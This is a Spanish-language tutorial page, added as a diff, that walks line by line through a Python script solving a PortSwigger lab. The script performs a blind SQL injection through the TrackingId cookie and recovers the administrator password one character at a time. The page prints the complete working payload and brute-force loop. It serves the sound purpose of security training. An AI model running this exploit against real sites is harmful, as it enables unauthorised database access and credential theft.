@@ -1,0 +1,176 @@
+---
+title: "Explicación — Script Python"
+description: "Desglose línea por línea del script de Python usado para automatizar la extracción de la contraseña mediante Blind SQL Injection en el lab #11."
+date: "2026-07-13"
+---
+
+## 🐍 Script Python — Blind SQLi con respuestas condicionales
+
+Este script automatiza una inyección SQL ciega (Blind SQL Injection) que recupera la contraseña del usuario **administrator** letra por letra, observando si una cadena esperada aparece en la respuesta.
+
+---
+
+### 📦 Librerías utilizadas
+
+```python
+import requests
+import string
+import urllib.parse
+import urllib3
+```
+
+- `requests`: para enviar peticiones HTTP al servidor vulnerable.
+- `string`: para usar todos los caracteres imprimibles (`string.printable`) como diccionario de fuerza bruta.
+- `urllib.parse`: no se usa en este script, podría eliminarse.
+- `urllib3`: se usa para desactivar advertencias de certificados SSL.
+
+---
+
+### 🚫 Desactiva advertencias por certificados SSL autofirmados
+
+```python
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+```
+
+- Los laboratorios de PortSwigger usan HTTPS, pero con certificados que pueden generar advertencias.
+- Esta línea evita que se impriman esos avisos molestos en consola.
+
+---
+
+### 🔗 URL del sitio objetivo
+
+```python
+url = 'https://0a550059036c31ca80ab17d2001600e5.web-security-academy.net/'
+```
+
+- URL de la instancia del laboratorio (se debe cambiar según el entorno actual).
+
+---
+
+### 🧬 Payload SQLi
+
+```python
+payload = "'+and+(select+substring(password,{},1)+from+users+where+username='administrator')='{}'--"
+```
+
+- Este payload compara letra por letra la contraseña del usuario `administrator`.
+- `substring(password,{},{})`: extrae una sola letra en cada iteración.
+- `{}`: se usan para inyectar dinámicamente:
+    - La **posición** del carácter.
+    - El **carácter actual** a comprobar.
+
+---
+
+### 🔠 Diccionario de caracteres
+
+```python
+characters = string.printable
+```
+
+- Contiene todos los caracteres imprimibles: letras, números, símbolos y espacios.
+- El script probará cada uno hasta encontrar coincidencias.
+
+---
+
+### 🔐 Inicialización de la contraseña
+
+```python
+password = ''
+```
+
+- Se irá construyendo la contraseña, letra por letra, en esta variable.
+
+---
+
+### 🔁 Bucle de fuerza bruta
+
+```python
+for i in range(1, 21):
+```
+
+- La contraseña tiene **20 caracteres**, por eso se usa `range(1, 21)` (el índice en SQL empieza en 1).
+
+---
+
+### 🔁 Segundo bucle: prueba de cada carácter
+
+```python
+    for char in characters:
+```
+
+- Se prueba cada carácter del diccionario para la posición actual.
+
+---
+
+### 🍪 Modificación de la cookie vulnerable
+
+```python
+        cookie = {'TrackingId': 'LWeCp2OLn9FMlPlC' + payload.format(i, char)}
+```
+
+- Se inserta el payload directamente en el valor de la cookie `TrackingId`.
+- Esto simula el comportamiento de un ataque Blind SQLi en una cookie.
+
+---
+
+### 📡 Envío de la solicitud
+
+```python
+        r = requests.get(url, cookies=cookie, verify=False)
+```
+
+- Se envía una petición GET al servidor con la cookie modificada.
+- `verify=False`: ignora errores SSL.
+
+---
+
+### ✅ Comprobación de condición verdadera
+
+```python
+        if "Welcome" in r.text:
+```
+
+- Si la condición es verdadera, la respuesta contiene `"Welcome"` (o algún indicador definido por el servidor).
+- Esto confirma que el carácter probado es correcto.
+
+---
+
+### 🔡 Almacenar el carácter correcto
+
+```python
+            password += char
+            break
+```
+
+- Se añade el carácter correcto a la variable `password`.
+- Se rompe el bucle interno para continuar con la siguiente posición.
+
+---
+
+### 📤 Mostrar progreso
+
+```python
+    print("[*] La contraseña es: {}".format(password))
+```
+
+- Se imprime el progreso de la contraseña en cada iteración para seguimiento en tiempo real.
+
+---
+
+### ✅ Resultado esperado
+
+El script debería imprimir algo como:
+
+```
+[*] La contraseña es: a
+[*] La contraseña es: aD
+[*] La contraseña es: aDt
+...
+[*] La contraseña es: aDt3LkV9j1HsQ2Xn5ZbC
+```
+
+---
+
+## 🧠 Resumen
+
+Este script realiza un ataque de **Blind SQL Injection basado en respuestas condicionales** para exfiltrar la contraseña de forma controlada, sin necesidad de ver los datos directamente. Es ideal para laboratorios que utilizan mensajes o comportamientos para inferir resultados de la base de datos.
